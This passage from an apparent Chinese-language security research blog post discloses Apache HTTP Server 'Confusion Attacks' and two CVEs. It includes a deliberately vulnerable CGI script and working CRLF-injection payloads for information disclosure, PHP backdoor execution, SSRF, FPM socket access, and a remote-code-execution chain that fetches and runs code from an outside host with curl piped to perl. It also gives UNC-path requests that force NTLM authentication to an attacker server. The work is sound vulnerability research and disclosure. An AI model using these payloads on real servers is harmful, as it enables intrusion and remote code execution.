至於如何在真實情境中觸發這個伺服器轉址呢？ 由於至少需要控制 HTTP 回應中 `Content-Type` 及部分 `Location`，這裡給出兩個情境以供參考：

1. 位於 CGI 回應標頭中的 CRLF Injection，透過換行去覆寫已存在的 HTTP 標頭
2. 可完整控制回應標頭的 SSRF，例如託管在 `mod_wsgi` 上的 [django-revproxy](https://django-revproxy.readthedocs.io/en/latest/) 專案

接下來的範例都基於這個不安全的 CRLF Injection 來做示範：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```<br>#!/usr/bin/perl <br> <br>use CGI;<br>my $q = CGI->new;<br>my $redir = $q->param("r");<br>if ($redir =~ m{^https?://}) {<br>    print "Location: $redir\n";<br>}<br>print "Content-Type: text/html\n\n";<br>``` |

#### [✔️ 3-2-1. Arbitrary Handler to Information Disclosure](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-3-2-1-Arbitrary-Handler-to-Information-Disclosure "✔️ 3-2-1. Arbitrary Handler to Information Disclosure") ✔️ 3-2-1. Arbitrary Handler to Information Disclosure

首先是從任意模組處理器呼叫到資訊洩漏，這裡使用了 Httpd 內建的 `server-status` 模組處理器，這個模組處理器通常只被允許從本機存取：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br><Location /server-status><br>    SetHandler server-status<br>    Require local<br></Location><br>``` |

在擁有任意模組處理器呼叫後，可以透過複寫 `Content-Type` 去存取原本存取不到的敏感資訊：

> http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
>
> _**Location:/ooo**_ %0d%0a
>
> _**Content-Type:server-status**_ %0d%0a
>
> %0d%0a

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/dacded9bea644dff-10.png)

#### [✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts "✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts") ✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts

當然也能輕鬆的把一張圖片轉化成 PHP 後門，例如當使用者上傳了一個擁有合法副檔名的檔案後，可以透過這個攻擊手法指定特定模組 `mod_php` 去執行檔案內嵌的惡意程式碼，例如：

> http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
>
> _**Location:/uploads/avatar.webp**_ %0d%0a
>
> _**Content-Type:application/x-httpd-php**_ %0d%0a
>
> %0d%0a

#### [✔️ 3-2-2. Arbitrary Handler to Full SSRF](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-3-2-2-Arbitrary-Handler-to-Full-SSRF "✔️ 3-2-2. Arbitrary Handler to Full SSRF") ✔️ 3-2-2. Arbitrary Handler to Full SSRF

呼叫 `mod_proxy` 存取任何協議以及任意網址當然也不在話下，例如：

> http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
>
> _**Location:/ooo**_ %0d%0a
>
> _**Content-Type:proxy:http://example.com/%3F**_ %0d%0a
>
> %0d%0a

另外這也是一個可以完整控制 HTTP 請求還有取得所有 HTTP 回應的 SSRF！ 稍微可惜的一點是在存取 Cloud Metadata 時會被 `mod_proxy` 會自動加上 `X-Forwarded-For` 標頭導致被 EC2 及 GCP 的 [Metadata 保護機制](https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations) 阻擋，否則這會是一個更強大的攻擊手法。

#### [✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket "✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket") ✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket

然而 `mod_proxy` 提供了一個更「方便」的功能 —— 可以存取本地的 Unix Domain Socket！ 😉

這裡展示透過存取 PHP-FPM 本地的 Unix Domain Socket 去執行位於 `/tmp/` 下的 PHP 後門：

> http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
>
> _**Location:/ooo**_ %0d%0a
>
> _**Content-Type:proxy:unix:/run/php/php-fpm.sock\|fcgi://127.0.0.1/tmp/ooo.php**_ %0d%0a
>
> %0d%0a

這個手法理論上還存在著更多的可能性，例如協議走私 (在 HTTP/HTTPS 協議間走私 FastCGI 😏) 或其它易受影響的 Local Sockets 等，這都交給有興趣的人繼續研究了。

#### [✔️ 3-2-4. Arbitrary Handler to RCE](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-3-2-4-Arbitrary-Handler-to-RCE "✔️ 3-2-4. Arbitrary Handler to RCE") ✔️ 3-2-4. Arbitrary Handler to RCE

最後來展示一下如何透過一個常見的 CTF 小技巧把這個攻擊手法轉化成 RCE！ 由於 PHP 官方的 [Docker 映像檔](https://hub.docker.com/_/php) 在建構時引入了 PEAR 這套命令列 PHP 套件管理工具，透過其中的 `Pearcmd.php` 作為入口點可以讓我們達成更進一步的利用，詳細的歷史及原理可以參考由 [Phith0n](https://x.com/phithon_xg) 撰寫的 [Docker PHP LFI 總結文](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)。

這裡我們利用在 `run-tests` 內的 Command Injection 來完成整個攻擊鏈，詳細的攻擊鏈如下：

> http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
>
> _**Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x\|perl) %2b alltests.php**_ %0d%0a
>
> _**Content-Type:proxy:unix:/run/php/php-fpm.sock\|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php**_ %0d%0a
>
> %0d%0a

網路上經常在 Security Advisory 或 Bug Bounty 看到把 CRLF Injection 或 Header Injection 當成 XSS 報告，雖然確實有機會透過 SSO 串出 Account Takeover 等精彩漏洞，但請不要忘了它也能串出 Server-Side RCE，這個示範證明了它的可能！

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/c46787187d97fc85-11.png)

## [🔥 4. 其它漏洞](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%F0%9F%94%A5-4-%E5%85%B6%E5%AE%83%E6%BC%8F%E6%B4%9E "🔥 4. 其它漏洞") 🔥 4\. 其它漏洞

基本上整個 Confusion Attacks 系列到這邊差不多告一個段落，然而在研究 Apache HTTP Server 的過程中還有些值得一提的漏洞因此將它們獨立出來。

### [⚔️ CVE-2024-38472 - 基於 Windows UNC 的 SSRF](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-CVE-2024-38472-%E5%9F%BA%E6%96%BC-Windows-UNC-%E7%9A%84-SSRF "⚔️ CVE-2024-38472 - 基於 Windows UNC 的 SSRF") ⚔️ CVE-2024-38472 - 基於 Windows UNC 的 SSRF

首先是 `apr_filepath_merge()` 函數在 Windows 的實作允許使用 UNC 路徑，下面提供兩種不同的觸發路徑讓攻擊者可以向任意主機發起 NTLM 認證：

#### [✔️ 透過 HTTP 請求解析器觸發](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-%E9%80%8F%E9%81%8E-HTTP-%E8%AB%8B%E6%B1%82%E8%A7%A3%E6%9E%90%E5%99%A8%E8%A7%B8%E7%99%BC "✔️ 透過 HTTP 請求解析器觸發") ✔️ 透過 HTTP 請求解析器觸發

想要直接透過 HTTP 請求觸發需要在 Httpd 中設置額外的設定，雖然這個設定第一眼看起來有點不現實，但似乎經常與 Tomcat (`mod_jk`、`mod_proxy_ajp`) 或是與 [PATH\_INFO](https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes) 一起出現：

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>AllowEncodedSlashes On<br>``` |

另外由於 Httpd 在 2.4.49 後重寫了核心 HTTP 請求解析器邏輯，要在大於此版本的 Httpd 上觸發漏洞需要再額外加上一個設定：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>AllowEncodedSlashes On<br>MergeSlashes Off<br>``` |

透過兩個 `%5C` 可以使強迫 Httpd 向 `attacker-server` 發起 NTLM 認證，實務上也可透過 [NTLM Relay](https://en.hackndo.com/ntlm-relay/) 的方式將此 SSRF 轉化成 RCE！

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>$ curl http://server/%5C%5Cattacker-server/path/to<br>``` |

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/444e2b7b11c6c80e-12.png)

#### [✔️ 透過 Type-Map 觸發](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-%E9%80%8F%E9%81%8E-Type-Map-%E8%A7%B8%E7%99%BC "✔️ 透過 Type-Map 觸發") ✔️ 透過 Type-Map 觸發

[Debian/Ubuntu 的 Httpd 發行版](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235) 中預設啟用了 Type-Map：

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>AddHandler type-map var<br>``` |

透過上傳一個 `.var` 檔案到伺服器，將其中 URI 欄位指定成 UNC 路徑也可強迫伺服器向攻擊者發起 NTLM 認證，這也是我所提出的 [第二個 `.var` 小技巧](https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle) 😉

### [⚔️ CVE-2024-39573 - 基於 RewriteRule 前綴可完全控制的 SSRF](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-CVE-2024-39573-%E5%9F%BA%E6%96%BC-RewriteRule-%E5%89%8D%E7%B6%B4%E5%8F%AF%E5%AE%8C%E5%85%A8%E6%8E%A7%E5%88%B6%E7%9A%84-SSRF "⚔️ CVE-2024-39573 - 基於 RewriteRule 前綴可完全控制的 SSRF") ⚔️ CVE-2024-39573 - 基於 `RewriteRule` 前綴可完全控制的 SSRF

最後則是當位於 `Server Config` 或是 `VirtualHost` 中的 `RewriteRule` 前綴完全可控時，可以呼叫到 Proxy 以及相關子模組：

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>RewriteRule ^/broken(.*) $1<br>``` |

透過下列網址可將請求轉交給 `mod_proxy` 處理：

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>$ curl http://server/brokenproxy:unix:/run/[...]|http://path/to<br>``` |

但如果網管有好好測試，就會發現這樣子的規則是不實際的，所以原本只把它當成另外一個漏洞的搭配組合一起回報，沒想到這個行為也被當成一個安全邊界修復。 再隨著修補出來後也看到其他研究員把同樣行為套用在 Windows UNC 上獲得另外一個額外的 CVE。

# [未來研究方向](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E6%9C%AA%E4%BE%86%E7%A0%94%E7%A9%B6%E6%96%B9%E5%90%91 "未來研究方向") 未來研究方向

最後是關於這份研究的未來的一些展望以及可加強的地方，基本上 Confusion Attacks 仍然是一個很有潛力的攻擊面，尤其是我這次的研究主要也只專注在兩個欄位上而已，只要 Apache HTTP Server 沒有好好從底層進行結構性加強或提供給開發者一個好的開發標準，相信未來還會有更多「混淆」出現！

至於還有哪些方面可以加強呢？ 其實不同的 Httpd 發行版會有不同的設定檔案，因此其它的 Unix-Like 系統例如 RHEL 家族、BSD 系列，甚至使用到 Httpd 的套裝軟體，它們都有機會出現更多可跳脫的重寫規則、更多厲害的 Local Gadgets 甚至意料外的符號跳躍等等 ，就交給有興趣的人繼續吧。

最後由於時程因素，來不及分享更多在實際網站、設備，甚至開源專案上發現並利用的真實案例，不過你應該已經可以想像 —— 在真實世界中絕對還藏著千千萬萬個比想像中還要大量未開採的規則、可繞過的認證，以及隱藏在檯面下的 CGI，至於如何把這篇裡面所講到的技巧實際應用在全世界上？ 接下來就是你們的任務了！

# [結語](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E7%B5%90%E8%AA%9E "結語") 結語

維護一個 Open Source 專案真的是一件很困難的事，尤其在讓使用者方便的同時兼顧舊版本的相容性，稍有不慎可能就會造成整個系統被攻破 (例如 Httpd 2.4.49 中因為一個路徑處理邏輯小改動導致災難性的 [CVE-2021-41773](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773))，整個開發過程必須要小心翼翼的踩在一堆遺留程式碼以及技術債上。 所以如果真的有 Apache HTTP Server 的開發者看到這篇文我想說： 謝謝你們的貢獻！